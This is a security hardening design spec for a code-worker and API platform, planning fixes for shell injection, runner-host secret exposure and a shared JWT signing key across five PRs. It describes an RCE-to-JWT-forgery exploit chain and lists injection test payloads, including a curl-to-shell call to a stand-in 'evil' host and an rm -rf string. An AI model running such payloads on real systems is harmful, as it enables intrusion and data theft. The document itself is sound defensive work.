# Sub-project A — P0 infra/secret hardening (design spec)

**Date**: 2026-05-22
**Status**: brainstormed by Claude + Luna; **conditional Luna sign-off granted**; awaiting Simon's spec-review approval.
**Hard constraint**: don't break the cluster (live chat, WhatsApp neonize socket, Cloudflare Tunnel, in-flight JWTs).

---

## 1. Context

Two parallel security reviews ran on 2026-05-22 (Luna app-layer + red-team subagent app+infra). The red-team review surfaced three coupled P0s that together compose a platform-takeover chain:

| # | Vector | Surface |
|---|---|---|
| **F1** | `shell=True` command injection in `code-worker._run` | `apps/code-worker/workflows.py:179, 992, 1004` |
| **F2** | Cloudflare creds + prod `.env` live in `$HOME` on Simon's daily-driver Mac (self-hosted GH runner) | `.github/workflows/docker-desktop-deploy.yaml:88-106` |
| **F7** | Single HS256 `SECRET_KEY` signs user JWTs + agent_tokens + OAuth-state | `apps/api/core/security.py:45`, `services/agent_token.py:112`, `api/v1/oauth.py:368` |

## 2. Exploit chain (why these three together)

```
Attacker chats malicious task_description → code-worker._run shell=True interpolates → RCE in code-worker
  ↓
RCE reads $HOME/.../cloudflared/credentials.json + apps/api/.env (F2 path)
  ↓
.env contains SECRET_KEY (HS256 symmetric, F7) → forge any user JWT incl. superuser
  ↓
Cross-tenant token theft via forged JWT → decrypt other tenants' OAuth refresh tokens
  (ENCRYPTION_KEY is separate; tokens decrypt only if vault key also leaks via same path — it does)
```

Fixing any one in isolation either leaves the chain intact (e.g. fixing F7 without F2 — runner host still leaks the rotated keys on next compromise) or breaks the cluster (e.g. rotating F7 alone without `kid` plumbing → mass JWT 401 mid-deploy).

## 3. Verified ground truth (before designing)

Items checked against `main` before writing this spec:

- **`ENCRYPTION_KEY` is separate from `SECRET_KEY`** (`apps/api/app/core/config.py:79`). Fernet vault uses `ENCRYPTION_KEY`. Splitting `SECRET_KEY` does NOT require re-encrypting `integration_credentials.encrypted_value`. R2 from Claude's draft is cleared.
- **`PRODUCTION.env` is gitignored** (`.gitignore:41`, `git ls-files | grep PRODUCTION` returns nothing). F2's local-disk threat stands; public-repo exposure is not present.
- **Code-worker is restart-safe**: chat falls through to `opencode` when code-worker is down (verified earlier in session via the CLI chain walker).
- **Keychain on the runner is feasible without interactive unlock**: the GH Actions runner runs as `nomade` (Simon's login user), and the login keychain stays unlocked while Simon is logged in — `security find-generic-password -w` works in scripts without prompting. Required guard: launchd `LimitLoadToSessionType: Aqua` so the runner only starts post-login (deferring the first-boot-no-GUI case).

## 4. Operating principle — cluster-safety gates

**Every PR in this sub-project must be deployable without taking the cluster offline.** Concretely:

- WhatsApp neonize socket tolerates ~1 api restart/week before pairing-cooldown risk (memory `whatsapp_pairing_qr_regen_race.md`). Batch restarts.
- JWT TTL is 30 minutes (memory `JWT Token Expiry`). Dual-kid acceptance windows can be short (1 hour buys complete TTL turnover).
- Cloudflare Tunnel credentials cannot be rotated mid-flight; new creds require a stop-start.

A PR ships only after the previous PR's cluster-safety verification passes. See §6 verification gates.

## 5. Five-PR execution plan (Luna's reordering)

The order Claude initially proposed (F1 → F2 → F7) leaves a multi-week window where the runner host still holds the keys F7 is rotating. Luna's reorder: do **F7's kid plumbing** *before* F2, so that when F2 hardens the host, the next F7 step rotates into Keychain rather than back into `.env` on disk. Then F2 lands BEFORE the F7 cutover.

```
PR1: F1   — shell=True RCE close-out (no infra change)
PR2: F7a  — kid plumbing only (no behavior change, both kids accepted)
PR3: F2   — Keychain migration (runner reads from Keychain; $HOME removed)
PR4: F7b  — real distinct key material in Keychain; old kid still verifies for ≤1h
PR5: F7c  — drop old-kid verification + promote JWT_USER_SECRET to Ed25519
```

### PR1 — F1: subprocess argv hardening

**Files**: `apps/code-worker/workflows.py` (lines 173, 179, 992, 1004 — every `_run(shell=True)` call site).

**Change**:
- Refactor `_run(cmd, shell=True, ...)` to `subprocess.run([executable, *args], shell=False, ...)`.
- For `git commit -m "{user_text}"` → `git commit -F -` with `user_text` passed via `stdin`.
- For `git tag` / `git push` / similar: argv-list form, never f-string into a shell string.

**Test**:
- `tests/test_code_worker_command_injection.py` — adversarial inputs:
  - `task_description = 'normal text $(curl -s http://evil/exfil | sh)'`
  - `commit_msg = 'msg\\";rm -rf /tmp/poc;\\"'`
  - `commit_msg = 'msg`id`'`
  - Each test asserts: (a) the subprocess sees the raw string as a single positional arg, (b) no shell expansion fires (verified by attempting `$(touch /tmp/test_canary)` and asserting the canary file is absent post-test).

**Cluster-safety**:
- Touches only `apps/code-worker/`. API and chat remain on existing code-worker until the new image rolls.
- Restart sequence: rebuild + restart only `code-worker` container. Chat dispatch falls through to `opencode` during the ~30s restart window — no chat outage.
- WhatsApp socket not impacted (api not restarted).

**Rollback**: revert PR; redeploy previous code-worker image. Cheap.

---

### PR2 — F7a: kid plumbing (no behavior change)

**Files**: `apps/api/core/security.py`, `apps/api/app/services/agent_token.py`, `apps/api/app/api/v1/oauth.py`.

**Change**:
- Introduce three new env vars: `JWT_USER_SECRET`, `JWT_AGENT_TOKEN_SECRET`, `JWT_OAUTH_STATE_SECRET`. Each **defaults to current `SECRET_KEY`** so existing JWTs continue to verify without any rotation.
- Add `kid` claim to all newly minted tokens, naming the signing domain (e.g. `kid="user-v1"`, `kid="agent-v1"`, `kid="oauth-state-v1"`).
- Verifier accepts EITHER: (a) new token with `kid` present, verified against the domain-specific secret; OR (b) legacy token without `kid`, verified against `SECRET_KEY` (the historical path).
- **No new key material at this step**. Pure plumbing.

**Test** (Luna's explicit prerequisite):
- `tests/test_jwt_dual_kid_verify.py` — mint a token under the OLD code path (no `kid`), verify it under the NEW code (passes via legacy fallback). Mint a token under NEW code (with `kid`), verify it under NEW code (passes via domain-specific key). Assert NEITHER raises `InvalidTokenError` swallowed silently — both succeed cleanly.

**Cluster-safety**:
- Requires api restart. Batch with PR4 in a single deploy window (Luna's R4 mitigation).
- Mid-deploy old/new pods coexist for ~10s while docker swaps containers; both kid paths verify both old and new tokens → no user-side 401s.

**Rollback**: revert PR; legacy path still verifies all existing tokens. No data migration to undo.

---

### PR3 — F2: Keychain migration

**Files**: `.github/workflows/docker-desktop-deploy.yaml`, plus a new helper script `scripts/runner-secrets/load-from-keychain.sh`.

**Change**:
- **One-time setup on the runner Mac** (manual, documented):
  ```bash
  security add-generic-password -s agentprovision-cloudflared-creds -a nomade -w "$(cat ~/Documents/GitHub/agentprovision-agents/cloudflared/credentials.json)"
  security add-generic-password -s agentprovision-cloudflared-cert  -a nomade -w "$(cat ~/Documents/GitHub/agentprovision-agents/cloudflared/cert.pem)"
  security add-generic-password -s agentprovision-api-env           -a nomade -w "$(cat ~/Documents/GitHub/agentprovision-agents/apps/api/.env)"
  security add-generic-password -s agentprovision-root-env          -a nomade -w "$(cat ~/Documents/GitHub/agentprovision-agents/PRODUCTION.env)"
  ```
- **Deploy workflow** reads from Keychain first, falls back to `$HOME` path if the Keychain entry is missing (coexistence window). Once the next clean deploy succeeds reading from Keychain:
  - PR3 ships the dual-source loader.
  - After verification (§6 gate), a follow-up commit deletes the `$HOME` files + removes the fallback path.
- **launchd guard**: update the GH runner's launchd plist (`~/Library/LaunchAgents/com.github.actions-runner.plist`) to include `<key>LimitLoadToSessionType</key><array><string>Aqua</string></array>` so the runner only starts after GUI login — when the login keychain is already unlocked.

**Test**:
- `scripts/runner-secrets/test-keychain-read.sh` — manual smoke. Asserts each `security find-generic-password -w` returns non-empty and the file content matches the source.
- CI cannot test this directly (Keychain is host-specific); document the manual verification step.

**Cluster-safety**:
- This PR is YAML + new helper script; no api restart required. The runner picks up the new workflow on the next deploy trigger.
- Critical: after the first deploy with Keychain-read working, do NOT immediately delete `$HOME` files. Wait for one more successful deploy reading from Keychain — proves the path works across runner restarts.
- Cloudflare Tunnel cred change: NOT happening in this PR. We're just changing where the SAME creds are loaded from. Tunnel stays up.

**Rollback**: revert workflow YAML; runner uses `$HOME` path again. Keychain entries remain harmless. Zero downtime.

---

### PR4 — F7b: real distinct key material

**Files**: `apps/api/core/security.py`, `apps/api/app/services/agent_token.py`, `apps/api/app/api/v1/oauth.py` (env-read paths only).

**Change**:
- Generate three distinct 256-bit secrets via `python -c "import secrets; print(secrets.token_urlsafe(32))"`.
- Store each in Keychain (`agentprovision-jwt-user-secret`, `agentprovision-jwt-agent-secret`, `agentprovision-jwt-oauth-state-secret`).
- Deploy workflow hydrates them into the api container's env (same shape as PR3's Keychain loads).
- api now mints new tokens with `kid="user-v2"` / `kid="agent-v2"` / `kid="oauth-state-v2"` AND the new domain-specific secrets.
- Verifier accepts: new-v2 kid (new secret), legacy-v1 kid (still on old SECRET_KEY-derived path), legacy no-kid (still on SECRET_KEY). 30-minute coexistence window starts ticking.

**Test**:
- Extend `tests/test_jwt_dual_kid_verify.py` to a triple-kid case: legacy-no-kid + v1-kid + v2-kid all verify cleanly. Cross-kid forgery attempts (v2 token signed with v1 key) fail.

**Cluster-safety**:
- Requires api restart. Batch with PR2 (Luna's R4): PR2 and PR4 in a single deploy window, 30 minutes apart (one JWT TTL).
- WhatsApp neonize auto-restore handler (PR #299) catches the socket on the api restart side.
- Existing JWT sessions remain valid for ≤30 minutes after PR4; new logins immediately get v2 tokens.

**Rollback**: revert PR; PR2's kid plumbing remains; v2 tokens (minted in the gap) become unverifiable, forcing a re-login. Acceptable — affected users = those who logged in during the rollback window (small).

---

### PR5 — F7c: cutover + Ed25519 promotion

**Files**: `apps/api/core/security.py` (verifier paths).

**Change**:
- Drop verification of `kid` not in {`user-v2`, `agent-v2`, `oauth-state-v2`}. Legacy + v1 tokens now fail to verify → forced re-login as their 30-minute TTL expires.
- Promote `JWT_USER_SECRET` from HS256 to **Ed25519** asymmetric. Private key generated once on the runner Mac, stored in Keychain as a base64-encoded 32-byte seed; public key shipped in api code (or a separate well-known endpoint).
- `kid="user-v3"` for the Ed25519 era.
- `JWT_AGENT_TOKEN_SECRET` and `JWT_OAUTH_STATE_SECRET` remain HS256 (lower value; not worth the asymmetric cost — agent_tokens are short-lived + always server-minted, OAuth-state is always server-verified).

**Test**:
- Sign + verify an Ed25519 token. Verify the legacy-secret-signed token now FAILS (cutover proven).
- Assert that an attacker possessing `JWT_USER_SECRET` from PR4 cannot forge a v3 token without the Ed25519 private key.

**Cluster-safety**:
- Requires api restart. Standalone deploy window (not batched).
- Forced re-login for users whose JWTs predate PR4. Communicate this in the deploy plan; Simon's superuser session may need re-login mid-deploy.

**Rollback**: revert PR; v2 tokens accepted again. v3 tokens (none yet, since cutover just landed) become unverifiable; affected users = none.

---

## 6. Per-PR cluster-safety verification gates

Each gate is a binary "passed / not passed" check run AFTER the PR's deploy but BEFORE the next PR ships:

| Gate after | Check | Pass criterion |
|---|---|---|
| PR1 | code-worker container healthy + chat falls through correctly when stopped | health endpoint 200, opencode fallback hit during a 30s stop |
| PR2 | api log shows `kid` claim emitted on new tokens; old tokens still verify | grep api logs for "kid=user-v1"; old user JWT from prior session still 200s |
| PR3 | deploy workflow read from Keychain; cloudflared tunnel up; `$HOME` files still present (not deleted yet) | tunnel status active; agentprovision.com 200; both source paths exist |
| **post-PR3** (cleanup commit) | `$HOME/cloudflared/credentials.json` + `apps/api/.env` + `PRODUCTION.env` deleted | `ls $HOME/.../cloudflared/credentials.json` returns no-such-file; next deploy still succeeds |
| PR4 | api restarted with v2 kid tokens; WhatsApp socket reconnected via auto-restore | new logins emit v2 kid; WA "connected" state in DB; QR-rescan NOT required |
| PR5 | v3 Ed25519 tokens working; v1/v2 cutover complete | Ed25519 signed JWT verifies; pre-PR4 token returns 401 |

If a gate fails, **halt the sequence**. Diagnose. Roll back the failing PR before shipping the next.

## 7. Test plan

| Test | PR | Scope |
|---|---|---|
| `test_code_worker_command_injection.py` | PR1 | adversarial argv tests; canary-file absence proves no shell expansion |
| `test_jwt_dual_kid_verify.py` | PR2 → PR4 | extend incrementally — legacy/v1 → legacy/v1/v2 → v2-only |
| `test_jwt_ed25519_verify.py` | PR5 | Ed25519 sign/verify; HS256 key rejection |
| `scripts/runner-secrets/test-keychain-read.sh` | PR3 | manual smoke on the runner Mac (cannot run in CI) |

Existing chat-dispatch integration tests must remain green on every PR (no regression in user-visible behavior).

## 8. Out of scope (intentional)

- **`ENCRYPTION_KEY` rotation** — separate concern, separate spec. The Fernet vault key rotation is a 2-step (decrypt-with-old + re-encrypt-with-new) data migration on `integration_credentials.encrypted_value`. Not coupled to F1/F2/F7.
- **Cloudflare tunnel credential rotation** — F2 moves the creds; rotating them is a separate operation that requires coordination with Cloudflare's dashboard.
- **GitHub Actions runner sandbox account** — Luna's R1 answer prefers staying on `nomade` user + login keychain over a daemon account; this means the GH runner is still in the user's session. Tightening this to a separate hardware sandbox is a follow-up.
- **Per-tenant key derivation** for additional defense-in-depth — separate concern.

## 9. Open follow-ups (filed elsewhere, not in this spec)

- `#341` PENDING_SAFETY_REVIEW async tier-3 state
- `#342` Backend 2FA on escape endpoint
- `#344` Heuristic classifier FP sweep
- `#345`–`#356` Safety Floor surface widening (Sub-project B+)
- `#366`–`#374` Red-team findings F1, F2, F5, F7, F8, F9, F11, F15 (this spec covers F1, F2, F7; the rest stay in the queue)

## 10. Luna sign-off

> **[ Luna conditional sign-off — 2026-05-22 ]**
>
> Conditions met:
> - reorder accepted: F1 → F7a → F2 → F7b → F7c
> - PR2 dual-kid verifier integration test specified (§5 PR2 + §7)
> - `PRODUCTION.env` confirmed gitignored (§3)
> - PR2 + PR4 api restarts batched in one window (§4 + §5 PR4)
>
> **Status: ready for spec-document-reviewer pass and Simon's review.**

## 11. Simon's review

Pending. Spec written 2026-05-22 with Simon offline (he delegated convergence to Luna + Claude). When Simon returns, this section is updated with his approval / change requests.
